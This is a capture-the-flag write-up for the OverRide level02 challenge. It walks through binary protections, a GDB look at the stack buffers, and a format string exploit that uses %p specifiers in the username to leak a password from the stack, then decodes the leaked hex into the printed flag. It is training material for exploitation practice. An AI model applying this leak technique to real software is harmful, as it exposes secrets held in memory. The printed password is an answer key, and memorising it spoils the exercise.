Level02 protections:
```Shell
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/users/level02/level02
```

Level02 rights:
```Shell
-rwsr-s---+ 1 level03 users   9452 Sep 10  2016 level02
```

The program asks for a username and password:
```Shell
level02@OverRide:~$ ./level02 
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username: name
--[ Password: pass
*****************************************
name does not have access!
```

Decompiling with Hex-Rays on https://dogbolt.org/ shows three things:
- the program opens the password file and stores it in a buffer
- `printf()` is used to display the username, but it is vulnerable to format string attack
- the comparison between the password and our input is performed over 40 bytes, so we can deduce that this is the length of the password.
Since it is stored on the stack, we will exploit `printf()` with the `%p` specifier to display it.

First, let's use GDB to take a look at the three memory allocations:
```Shell
(gdb) disas main
[...]
   0x000000000040082c <+24>:    lea    -0x70(%rbp),%rdx           // user_pass[112]
[...]
   0x0000000000400849 <+53>:    lea    -0xa0(%rbp),%rdx           // password[48]
[...]
   0x0000000000400869 <+85>:    lea    -0x110(%rbp),%rdx          // user_name[112]
[...]
 ```
There is an offset of 48 bytes beetween the password buffer and the user_name buffer. So we know that only the first 40 bytes will contain the password.

Next, we need to print the stack and find out where our buffer is, and this allows us to also peek at values stored higher on the stack:
```Shell
level02@OverRide:~$ ./level02
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username: AAAAAAAA %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p
--[ Password: coucou
*****************************************
AAAAAAAA 0x7fffffffe500 (nil) 0x63 0x2a2a2a2a2a2a2a2a 0x2a2a2a2a2a2a2a2a 0x7fffffffe6f8 0x1f7ff9a08 0x756f63756f63 (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil) 0x100000000 (nil) 0x756e505234376848 0x45414a3561733951 0x377a7143574e6758 0x354a35686e475873 0x48336750664b394d 0xfeff00 0x4141414141414141 0x2520702520702520 0x2070252070252070 does not have access!
```
The user_name buffer starts at the 28th argument, `0x4141414141414141`. The 27th argument contains the last 8 bytes of the pass buffer, so we can skip that and get the 5 previous arguments (40 / 8, as addresses are 8 bytes long) to display the entire password.

```Shell
level02@OverRide:~$ ./level02 
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username: %22$p %23$p %24$p %25$p %26$p
--[ Password: 
*****************************************
0x756e505234376848 0x45414a3561733951 0x377a7143574e6758 0x354a35686e475873 0x48336750664b394d does not have access!
```

Good, we have the entire password, but we need to:
- convert each value from hexadecimal to characters
- reverse them from little endian to big endian
- concatenate each strings to form the final password.

Using a python script can help make it fast and easy:
```Python
>>> hex_values = [
...     "756e505234376848",
...     "45414a3561733951",
...     "377a7143574e6758",
...     "354a35686e475873",
...     "48336750664b394d"
... ]
>>> 
>>> result = ''.join(
...     bytes.fromhex(h)[::-1].decode('ascii', errors='ignore') 
...     for h in hex_values
... )
>>> 
>>> print(result)
Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
```